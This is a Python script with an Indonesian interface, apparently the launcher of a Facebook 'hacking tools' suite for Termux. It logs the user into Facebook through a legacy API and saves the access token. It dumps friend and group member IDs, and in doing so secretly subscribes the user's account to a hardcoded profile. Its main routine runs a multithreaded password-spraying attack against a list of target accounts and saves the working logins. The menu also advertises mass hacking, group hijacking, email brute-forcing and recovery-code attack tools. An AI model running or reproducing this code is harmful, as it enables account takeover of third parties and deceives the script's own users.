#!usr/bin/python3.7
#Author: Elang X-CoderID
#contact: 0822475712**
#YouTube: Pangeran Alvins
import random
import sys
import time
try:
	from multiprocessing.pool import ThreadPool
	import os, requests, sys, json, time, hashlib, random
except Exception as F:
	exit("[ModuleErr] %s"%(F))

if sys.version[0] in '2':
	exit("[Maaf]  Install Python Version 3")
#color
r="\033[31m"
g="\033[32m"
w="\033[1;37m"
c="\033[36m"
y="\033[33m"
white = '\033[1;37m' # White 
red = '\033[31m' # red
orange = '\033[33m' # orange
blue = '\033[34m' # blue
p  = '\033[35m' # purple
C  = '\033[36m' # cyan
banner= blue+red+"""                                                                               
                                                                             
        ##        ###                                                  
     /####         ###                   #                             
    /  ###          ##                  ###                            
       /##          ##    ##             #                             
      /  ##         ##    ##                                           
      /  ##         ##     ##    ###   ###     ###  /###       /###    
     /    ##        ##      ##    ###   ###     ###/ #### /   / #### / 
     /    ##        ##      ##     ###   ##      ##   ###/   ##  ###/  
    /      ##       ##      ##      ##   ##      ##    ##   ####       
    /########       ##      ##      ##   ##      ##    ##     ###      
   /        ##      ##      ##      ##   ##      ##    ##       ###    
   #        ##      ##      ##      ##   ##      ##    ##         ###  
  /####      ##     ##      ##      /    ##      ##    ##    /###  ##  
 /   ####    ## /   ### /    ######/     ### /   ###   ###  / #### /   
/     ##      #/     ##/      #####       ##/     ###   ###    ###/    
#                                                                      
 ##"""+red+white+"""
╔════════════════════════════════════════════════════════════════════╗
 ---I--N--D--O--N--E---S--I--A----T--E--R--M--U--X----T--O--O--L--S---
╚════════════════════════════════════════════════════════════════════╝
  # Created By Alvins               
  # YouTube : Exploit ID            
  # WhatsApp : +62822475712**            
  # Facebook: Pangeran Alvins 
╔════════════════════════════════════════════════════════════════════╗"""
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.2)
mengetik('🔴  🔴  🔴  🔵 NB: SAYA HANYA MEMBERI PENGETAHUAN DAN TIDAK LEBIH ,SILAKAN PERGUNAKAN TOOLS TERSEBUT DENGAN BIJAK ,DAN SAYA TIDAK BERTANGGUNG JAWAB ATAS APAPUN YANG TERJADI!')
try:
	token=open('token/tokenmu.txt')
	token.close()
except IOError:
		try:
			os.system('clear')
			print(banner)
			try:
				os.mkdir('token')
			except OSError: pass
			print('╚════════════════════════════════════════════════════════════════════╝')
			print('🔴 JANGAN LUPA KUNJUNGI BLOG.SAYA DI⏺️') 
			print('   https://securitysystem404.blogspot.com/⏺️')
			print('   BANYAK INFORMASI TUTORIAL⏺️')
			print('   SEPUTAR TERMUX DAN ANDROID LAINNYA⏺️') 
			print('╚════════════════════════════════════════════════════════════════════╝')
			print('🔴 SILAKAN LOGIN FACEBOOK TERLEBIH DAHULU')
			print('═════════════════════════════════════════════════════════════════════');id = input('⏩ EMAIL/USERNAME : ');pwd = input('⏩ PASSWORD : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
			res=requ.json()['access_token']
			o=open('token/tokenmu.txt','w')
			o.write(res)
			print("[✔️] Sukses Memasukan Access Token")
			print("[✔️] access token Tersave: token/tokenmu.txt")
			time.sleep(3)
			o.close()
		except KeyError:
			print("[❌] Gagal Memasukan Access Token")
			print("[🔴] Silakan Cek Kembali username/password")
			exit()
		except (KeyboardInterrupt,EOFError):
			exit("\n[🗝️] Kunci Interupsi : exit.")
		except Exception as F:
			exit("[Error] %s"%(F))

def getFid():
	global toket
	print(banner)
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("[🔴] ID Teman Anda: ")
		b=open('dump/friends_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(token));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+token)
		s=json.loads(re.text)
		for i in s['friends']['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
		print('\n\r[✔️] ID Teman Berhasil Didapatkan')
		print("[✔️] file saved: dump/friends_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[🗝️] Kunci Interupsi: Berhenti.")
	except KeyError:
		os.remove('dump/friends_'+str(id)+'_id.txt')
		exit('[❌] Gagal Mengambil ID Teman')

def getGid():
	global token
	print(banner)
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("[🔴] ID Grup Kamu: ")
		b=open('dump/group_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+token);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+token)
		s=json.loads(re.text)
		for i in s['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
		print('\n\r[✔️] ID Anggota Grup Berhasil Terambil')
		print("[✔️] file saved: dump/group_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[🗝️] Kunci Interupsi: Berhenti.")
	except KeyError:
		os.remove('dump/group_'+str(id)+'_id.txt')
		exit('[❌] Gagal Mengambil ID Grup')

def rmtoken():
	ques=input("\n[🔴] Silakan Pilih (y/n) ")
	if ques == 'n' or ques == 'N':
		exit("[❌] Batalkan")
	elif ques == 'y' or ques == 'Y':
		os.remove('token/tokenmu.txt')
		exit("[✔️] Success Hapus Access Token")
	else: exit("[🔴] wrong input: exit")

def update():
	print("[🔴] Perbaharui...")
	os.system('cd;rm -rf Alvins-Tools')
	os.system('cd;git clone https://github.com/PangeranAlvins/Alvins-Tools')
	exit()

cek=[]
tap=[]
def main(arg):
        try:
                url='https://mbasic.facebook.com/login'
                dt={'email':arg,'pass':pas,'login':'submit'}
                req=requests.post(url,data=dt)
                respData = req.content
                if 'save-device' in str(respData) or 'm_sess' in str(respData):
                        true='yeah'
                        live="[FOUND] %s|%s"%(arg,pas)
                        tap.append(true)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        tulis="{}\n".format(live)
                        f=open('result/live.txt','a')
                        f.write(tulis)
                        print("%s[%sfound%s]%s %s => %s"%(c,g,c,w,arg,pas))
                        f.close()
                elif 'checkpoint' in str(respData):
                        true='notbad'
                        cek.append(true)
                        CP="[checkpoint] %s|%s"%(arg,pas)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        wrt="{}\n".format(CP)
                        f=open('result/live.txt','a')
                        f.write(wrt)
                        print("%s[%sCHECK%s]%s %s => %s"%(c,y,c,w,arg,pas))
                        f.close()
                else:
                        print("%s[%sNOT%s]%s %s"%(c,r,c,w,arg))
        except: pass

os.system('clear')
print(banner)
try:
	token=open('token/tokenmu.txt','r').read()
	nam=requests.get('https://graph.facebook.com/me/?access_token='+token)
	name=nam.json()['name']
except KeyError:
	print("\n[Maaf] Access token Sudah Tidak Valid Silakan Hapus Access Token Dengan Menekan (24) Lalu Silakan Login Ulang Lagi Terimakasih")
try:
	print("""\t     [ PERGUNAKAN DENGAN BIJAK! %s%s%s ]

                        [01]➡️ Mass Hacked
                        [02]➡️ SIKAT ID Facebook Teman
                        [03]➡️ Dump ID Grup Facebook
                        [04]➡️ Dark-FB No Lissece
                        [05]➡️ AutoReport Facebook v.3
                        [06]➡️ Hijacking Attack Grup Facebook
                        [07]➡️ MBF v.1
                        [08]➡️ MBF v.2 New Update
                        [09]➡️ Membuat Wordlist Password
                        [10]➡️ Compile Marshall Python
                        [11]➡️ Auto Bot Facebook (OSIF)
                        [12]➡️ Full Bot Instagram
                        [13]➡️ Clone Email Yahoo
                        [14]➡️ Facebook Phone Checker
                        [15]➡️ Access Token Checker Valid
                        [16]➡️ Tools NIK/KK Generator
                        [17]➡️ Brute Mail Gmail/Hotmail/Yahoo
                        [18]➡️ Email Checker Valid
                        [19]➡️ Subscribe Live Checker YouTube
                        [20]➡️ Facebook Checker Akun
                        [21]➡️ Profile Guard Facebook
                        [22]➡️ Facebook Chracker
                        [23]➡️ Facebook Recovery Code Attacker
                        [24]➡️ Hapus Access Token
                        [00]➡️ Cek Pembaruan"""%(y,name,w))
except (KeyError,NameError): pass
print('╚════════════════════════════════════════════════════════════════════╝')
pilih=int(input('\n[🔴] Pilih Tools⏩ '))
if pilih == 2:
	os.system('clear')
	getFid()
elif pilih == 3:
	os.system('python2 my/dump_grup.py')
	getGid()
elif pilih == 24:
	rmtoken()
elif pilih == 5:
	os.system('python2 my/Repot3.py')
	exit()
elif pilih == 6:
	os.system('python2 my/fbghack.py')
	exit()
elif pilih == 7:
	os.system('python2 my/MBF.py')
	exit()
elif pilih == 8:
	os.system('python2 my/MBF2.py')
	exit()
elif pilih == 9:
	os.system('python2 my/word.py')
	exit()
elif pilih == 10:
	os.system('python2 my/kompiler.py')
	exit()
elif pilih == 11:
	os.system('python2 my/bot.py')
	exit()
elif pilih == 12:
	input("[info] Sebelum Menggunakan Tools Ini Silakan Install Bahannya Terlebih Dahulu]")
	os.system('pkg install git && pkg install nodejs-lts && git clone https://github.com/officialputuid/toolsig && cd toolsig && unzip node_modules.zip && pip install node && node index.js')
	os.system('node my/toolsig/index.js')
	exit()
elif pilih == 13:
	input("[Info] Silakan Tekan Enter Untuk Melanjutkan [press enter]")
	os.system('python2 my/cloning.py')
	exit()
elif pilih == 14:
	os.system('python3 my/AccessToken-FB.py')
	exit()
elif pilih == 15:
	os.system('python3 my/accesstokens_chk.py')
	exit()
elif pilih == 4:
	os.system('python2 my/dark.py')
	exit()
elif pilih == 16:
	os.system('php my/gogenerate.php')
	exit()
elif pilih == 17:
	os.system('python2 my/hackmail.py')
	exit()
elif pilih == 18:
	os.system('python2 my/gmailchecker.py')
	exit()
elif pilih == 19:
	os.system('php my/subchecker.php')
	exit()
elif pilih == 20:
	os.system('php my/fbchecker.php')
	exit()
elif pilih == 21:
	os.system('php my/guard.php')
	exit()
elif pilih == 22:
	os.system('python2 my/fbchrack.py')
	exit()
elif pilih == 23:
	os.system('bash my/install.sh')
	os.system('python2 my/fb')
	exit()
elif pilih == 0:
	print("\n[🔵] Cek Pembaruan")
	rr=requests.get('https://raw.githubusercontent.com/PangeranAlvins/Alvins-Tools/master/README.md').text
	if 'v.9.5' in str(rr) or 'v.10.0' in str(rr):
		update()
	else: exit("[🔴] Baru Diperbarui")
else:
	os.system('clear')
	print(banner)

try:
        file=open(input("[in] ID List Target: ")).read().splitlines()
        pas=input("[in] Password To Crack: ")
except (KeyboardInterrupt,EOFError):
        exit("%s\n[🗝️] Kunci Interupsi: Exiting."%(r))
except FileNotFoundError:
        exit("%s\n[❌] File Tidak Tersedia: Exiting."%(r))
print("\n%s[LIVE RESULT]:"%(c))
o=[]
for x in file:
    o.append(x)
p=ThreadPool(50)
p.map(main,o)

if len(file) == 0:
	exit("%s[✔️] File empty\n"%(r))
if 'yeah' in str(tap) or 'notbad' in str(cek):
        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
        print("Live Results Tersimpan: result/live.txt")
else: print("[ %s:(%s ] nothing found"%(y,w))
